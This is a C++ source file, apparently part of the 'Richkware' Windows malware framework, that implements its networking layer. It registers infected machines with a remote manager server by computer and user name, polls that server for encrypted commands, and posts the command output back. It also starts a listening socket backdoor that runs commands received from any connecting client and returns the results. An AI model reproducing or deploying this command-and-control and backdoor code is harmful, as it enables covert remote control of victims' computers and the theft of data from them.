/*
*      Copyright 2016 Riccardo Melioli.
*/

#include "network.h"

Server::Server(std::string encryptionKeyArg) {
    encryptionKey = encryptionKeyArg;
    port = "none";
    hThread = NULL;
    listenSocket = INVALID_SOCKET;

    sta.encryptionKey = encryptionKeyArg;
    sta.ListenSocket = INVALID_SOCKET;
}

Server &Server::operator=(const Server &server) {
    encryptionKey = server.encryptionKey;
    port = server.port;
    hThread = server.hThread;
    listenSocket = server.listenSocket;

    sta.encryptionKey = server.sta.encryptionKey;
    sta.ListenSocket = server.sta.ListenSocket;
    return *this;
}

// TODO verificare funzionamento del server
//Network &Network::operator=(const Network &network) = default;

Network &Network::operator=(const Network &network) {
    encryptionKey = network.encryptionKey;
    defaultEncryptionKey = network.defaultEncryptionKey;
    serverAddress = network.serverAddress;
    port = network.port;
    associatedUser = network.associatedUser;
    server = network.server;
    return *this;
}

/*Network::Network(const std::string& encryptionKeyArg) {
    encryptionKey = encryptionKeyArg;
    server = Server(encryptionKeyArg);
}*/

Network::Network(const std::string &serverAddressArg, const std::string &portArg,
                 const std::string &associatedUserArg,
                 const std::string &encryptionKeyArg) {
    serverAddress = serverAddressArg;
    port = portArg;
    associatedUser = associatedUserArg;
    encryptionKey = encryptionKeyArg;
    //defaultEncryptionKey = "";
    server = Server(encryptionKeyArg);
}

Network::Network(const std::string &serverAddressArg, const std::string &portArg,
                 const std::string &associatedUserArg,
                 const std::string &encryptionKeyArg, const std::string &defaultEncryptionKeyArg) {
    serverAddress = serverAddressArg;
    port = portArg;
    associatedUser = associatedUserArg;
    encryptionKey = encryptionKeyArg;
    defaultEncryptionKey = defaultEncryptionKeyArg;
    server = Server(encryptionKeyArg);
}

std::string Network::RawRequest(const std::string &serverAddress, const std::string &port, const std::string &request) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    const char *sendbuf = request.c_str();
    const int bufferlength = 512;
    char recvbuf[bufferlength];
    int iResult;
    std::string response;

    // std::cout << "RawRequest:" << serverAddress << " " << port << " " << request << std::endl;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        return "Error: WSAStartup";
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(serverAddress.c_str(), port.c_str(), &hints, &result);
    if (iResult != 0) {
        WSACleanup();
        return "Error: getaddrinfo";
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                               ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            WSACleanup();
            return "Error: socket";
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int) ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);
    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return "Error: connect";
    }

    // Send an initial buffer
    iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return "Error: send";
    }

    // Receive until the peer closes the connection
    do {

        iResult = recv(ConnectSocket, recvbuf, bufferlength, 0);
        if (iResult > 0) {
            // answer
            response.append(recvbuf);
        } else if (iResult == 0) {
            // connection closed
        } else {
            // error
        }

    } while (iResult > 0);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return "Error: shutdown";
    }

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return response;
}


bool Network::UploadInfoToRMS() {
    return UploadInfoToRMS(serverAddress, port, associatedUser, server.getPort(), encryptionKey, defaultEncryptionKey);
}

bool
Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &port, const std::string &associatedUser,
                         const std::string &serverPort, const std::string &encryptionKey,
                         const std::string &defaultEncryptionKey) {
    Crypto crypto(encryptionKey);

    std::string name = getenv("COMPUTERNAME");
    name.append("/");
    name.append(getenv("USERNAME"));

    name = crypto.Encrypt(name, defaultEncryptionKey);

    // encrypt only serverPort because name is used by the server to recognize the device
    std::string serverPortS = crypto.Encrypt(serverPort);
    //Device device = Device(name, serverPortS);
    //std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";

    std::string associatedUserS = crypto.Encrypt(associatedUser);

    std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
                         "&data1=" + serverPortS +
                         "&data2=" + associatedUserS +
                         "&channel=richkware"
                         " HTTP/1.1\r\n" +
                         "Host: " + serverAddress + "\r\n" +
                         "Connection: close\r\n" +
                         "\r\n";

    std::string response = RawRequest(serverAddress, port, packet.c_str());
    if (response.find("Error") != std::string::npos) {
        return false;
    }
    return true;
}

std::string Network::fetchCommand(/*const std::string &encryptionKey*/) {
    Crypto crypto(encryptionKey);
    std::string device = getenv("COMPUTERNAME");
    device.append("/");
    device.append(getenv("USERNAME"));

    std::string srvAddr(serverAddress);
    std::string prt(port);

    device = crypto.Encrypt(device);

    http::Request request(
            "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data0=" + device +
            "&channel=richkware");

//    std::string parameters = "{data0:\"" + device + "\",data1:\"agent\"}";
//    std::cout << parameters << std::endl;
    http::Response response = request.send("GET");
    std::string jsonResponse(response.body.begin(), response.body.end());
    if (jsonResponse.find("OK") != std::string::npos) {
        std::string delimiter = "\"message\":\"";
        std::string delimiter2 = "\"";

        size_t pos = 0;
        pos = jsonResponse.find(delimiter);
        jsonResponse.erase(0, pos + delimiter.length());

        std::string token2;
        pos = jsonResponse.find(delimiter2);
        return jsonResponse.substr(0, pos);
    }
    return "";

//    Crypto crypto(encryptionKey);
//    std::string device = getenv("COMPUTERNAME");
//    device.append("/");
//    device.append(getenv("USERNAME"));
//
//    std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
//                         "&data1=agent" +
//                         " HTTP/1.1\r\n" +
//                         "Host: " + serverAddress + "\r\n" +
//                         "Connection: close\r\n" +
//                         "\r\n";
//
//    std::string response = RawRequest(serverAddress, port,
//                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
    /*
     * JSON format returned by server:
     * {
     *     status: "OK",
     *     statusCode: 1000,
     *     message: {
     *         commands: "[encrypted string]"
     *     }
     * }
     *
     * "encrypted string" is formatted as follows:
     * "command1##command2##commandN"
     * */
    //parse message from server
//    if (response.find("OK") != std::string::npos) {
//        std::string delimiter = "\"message\":\"";
//        std::string delimiter2 = "\"";
//
//        size_t pos = 0;
//        std::string token;
//        pos = response.find(delimiter);
//        response.erase(0, pos + delimiter.length());
//
//        std::string token2;
//        pos = response.find(delimiter2);
//        token = response.substr(0, pos);
//        return token;        //returns an encrypted string containing the commands to be executed
//    } else {
//        //TODO: manage KO from server
//        return "";
//    }
}

bool Network::uploadCommand(std::string commandsOutput/*, const std::string &encryptionKey*/) {
    Crypto crypto(encryptionKey);
    std::string device = getenv("COMPUTERNAME");
    device.append("/");
    device.append(getenv("USERNAME"));

    std::string srvAddr(serverAddress);
    std::string prt(port);

    http::Request request("http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command");

    // TODO testare con crittografia
    //commandsOutput = crypto.Encrypt(commandsOutput);
    commandsOutput = Base64_urlencode(commandsOutput);

    std::string parameters = "{device:\"" + device + "\",data:\"" + commandsOutput + "\"}";

    http::Response response = request.send("POST", parameters, {
            "Content-Type: application/json"
    });

    if (std::string(response.body.begin(), response.body.end()).find("OK") != std::string::npos) {
        return true;
    }
    return false;

//    std::string packet = "POST /Richkware-Manager-Server/command HTTP/1.1\r\nHost: " + srvAddr +
//                         "\r\n" +
//                         "Connection: close\r\n" +
//                         "\r\n" +
//                         "{\"device\": \"" + device + "\", \"data\": \"" + commandsOutput +"\"}";
//    std::string packet = "POST /Richkware-Manager-Server/command HTTP/1.1\r\n"
//                         "\r\n"
//                         "Content-Type: application/json; charset=utf-8\r\n"
//                         "Host: " + srvAddr + ":" + prt + "\r\n"
//                         "Connection: Close\r\n"
//                         "\r\n"
//                         "{\"device\":\"" + device + "\",\"data\":\"" + commandsOutput + "\"}";
//
//    std::string response = RawRequest(serverAddress, port,
//                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
//    std::cout << response << std::endl;
//    //parse message from server
//    if (response.find("OK") != std::string::npos) {
//        return true;
//    } else {
//        //TODO: manage KO from server
//        return false;
//    }
//    std::string response = RawRequest(serverAddress, port, packet);
//    //std::cout<<response<<std::endl;
//    if (response.find("Error") != std::string::npos){
//        return false;
//    }
//    return true;
}

std::string Network::GetEncryptionKeyFromRMS() {
    return GetEncryptionKeyFromRMS(serverAddress, port, associatedUser, encryptionKey);
}

std::string Network::GetEncryptionKeyFromRMS(const std::string &serverAddress, const std::string &port,
                                             const std::string &associatedUser, const std::string &encryptionKey) {
    Crypto crypto(encryptionKey);
    std::string key;

    // create a database entry into the Richkware-Manager-Server, to obtain the encryption key server-side generated
    UploadInfoToRMS(serverAddress, port, associatedUser, "none", encryptionKey, encryptionKey);

    // Primary key in RMS database.
    std::string name = getenv("COMPUTERNAME");
    name.append("/");
    name.append(getenv("USERNAME"));

    std::string nameS = crypto.Encrypt(name);

    std::string packet = "GET /Richkware-Manager-Server/encryptionKey?id=" + nameS + "&channel=richkware HTTP/1.1\r\n"
                                                                                     "Host: " + serverAddress + "\r\n" +
                         "Connection: close\r\n" +
                         "\r\n";

    key = RawRequest(serverAddress, port, packet);
    // If no matches were found, the function "find" returns string::npos
    if (key.find('$') != std::string::npos) {
        key = key.substr(key.find('$') + 1, (key.find('#') - key.find('$')) - 1);
        key = crypto.Decrypt(key);
    }

    return key;
}

std::string Network::ResolveAddress(const std::string &address) {
    std::string addressIP;
    WSADATA wsaData;
    struct hostent *remoteHost;
    char *host_name;
    struct in_addr addr = {};
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    host_name = (char *) address.c_str();
    remoteHost = gethostbyname(host_name);
    if (remoteHost != NULL) {
        if (remoteHost->h_addrtype == AF_INET) {
            int i = 0;
            while (remoteHost->h_addr_list[i] != 0) {
                addr.s_addr = *(u_long *) remoteHost->h_addr_list[i++];
                addressIP = inet_ntoa(addr);
                break;
            }
        }
    }
    return addressIP;
}


void Server::Start(std::string portArg, bool encrypted) {
    DWORD dwThreadId;
    port = portArg;

    if (encrypted)
        sta.encryptionKey = encryptionKey;
    else
        sta.encryptionKey = "";

    SOCKET listenSocketTmp = INVALID_SOCKET;

    WSADATA wsaData;
    int iResult;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        //throw 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, portArg.c_str(), &hints, &result);
    if (iResult != 0) {
        WSACleanup();
        //throw 1;
    }

    // Create a SOCKET for connecting to server
    listenSocketTmp = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (listenSocketTmp == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        //throw 1;
    }

    // Setup the TCP listening socket
    iResult = bind(listenSocketTmp, result->ai_addr, (int) result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        freeaddrinfo(result);
        closesocket(listenSocketTmp);
        WSACleanup();
        //throw 1;
    }

    freeaddrinfo(result);

    iResult = listen(listenSocketTmp, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        closesocket(listenSocketTmp);
        WSACleanup();
        //throw 1;
    }

    listenSocket = listenSocketTmp;
    sta.ListenSocket = listenSocketTmp;

    hThread = CreateThread(0, 0, &ServerThread,
                           (void *) &sta, 0, &dwThreadId);
}

void Server::Stop() {
    port = "none";

    closesocket(listenSocket);
    WSACleanup();

    DWORD dwExit;
    GetExitCodeThread(hThread, &dwExit);
    TerminateThread(hThread, dwExit);
    //CloseHandle(hThread);
}

HANDLE Server::getHhread() {
    return hThread;
}

std::string Server::getPort() {
    return port;
}

DWORD WINAPI

ServerThread(void *arg) {
    std::string encryptionKey = (std::string) ((*((ServerThreadArgs *) arg)).encryptionKey);
    SOCKET ListenSocket = (SOCKET) ((*((ServerThreadArgs *) arg)).ListenSocket);

    //HANDLE hClientThreadArray[1000];
    SOCKET ClientSocket = INVALID_SOCKET;
    while (true) {
        // Accept a client socket
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) {
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        } else {
            ClientSocketThreadArgs *csa = new ClientSocketThreadArgs();
            csa->ClientSocket = ClientSocket;
            csa->encryptionKey = encryptionKey;

            //hClientThreadArray[i] =
            /*HANDLE hThreadC = */CreateThread(0, 0, &ClientSocketThread, (void *) /*&*/csa, 0, NULL);
            // detach
//            CloseHandle(hThreadC);
        }
    }
    return 0;
}


DWORD WINAPI

ClientSocketThread(void *arg) {
    ClientSocketThreadArgs csta = *((ClientSocketThreadArgs *) arg);
    SOCKET ClientSocket = csta.ClientSocket;
    std::string encryptionKey = csta.encryptionKey;

    Crypto crypto(encryptionKey);
    const int bufferlength = 512;
    int iResult;

    std::string command;
    std::string response;
    int iSendResult;
    char recvbuf[bufferlength];
    std::size_t posSubStr;

    // Receive until the peer shuts down the connection
    if (encryptionKey.compare("") != 0) {
        send(ClientSocket, "\nEncrypted Connection Established\n", 34, 0);
    } else {
        send(ClientSocket, "\nConnection Established\n", 24, 0);
    }

    do {
        memset(&recvbuf[0], 0, sizeof(recvbuf));
        iResult = recv(ClientSocket, recvbuf, bufferlength, 0);
        command.append(recvbuf);
        //command = recvbuf;

        // string decryption

        if (encryptionKey.compare("") != 0) {
            command.erase(command.find("\r\n"), command.length());
            command = crypto.Decrypt(command);
            command.append("\r\n");
        }

        posSubStr = command.find("\n");
        if (posSubStr != std::string::npos) {
            // erase escape characters
            //command.erase(posSubStr);

            response = CommandsDispatcher(command);

            // string encryption
            if (encryptionKey.compare("") != 0) {
                std::string encResponse = (crypto.Encrypt(response) + "\n");
                iSendResult = send(ClientSocket, encResponse.c_str(), encResponse.length(), 0);
            } else {
                iSendResult = send(ClientSocket, response.c_str(), response.length(), 0);
            }


            if (iSendResult == SOCKET_ERROR) {
                closesocket(ClientSocket);
                WSACleanup();
                return 1;
            }
        }
        command = "";
        command.clear();

    } while (iResult > 0 && response.compare("***quit***") != 0);

    send(ClientSocket, "\nConnection Stopped\n", 20, 0);

    // shutdown the connection
    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }
    return 0;
}

Device::Device(std::string nameArg, std::string serverPortArg) {
    name = nameArg;
    serverPort = serverPortArg;
}

Device &Device::operator=(const Device &device) {
    name = device.name;
    serverPort = device.serverPort;
    return *this;
}

std::string Device::getName() {
    return name;
}

std::string Device::getServerPort() {
    return serverPort;
}

void Device::setName(std::string nameArg) {
    name = nameArg;
}

void Device::setServerPort(std::string serverPortArg) {
    serverPort = serverPortArg;
}
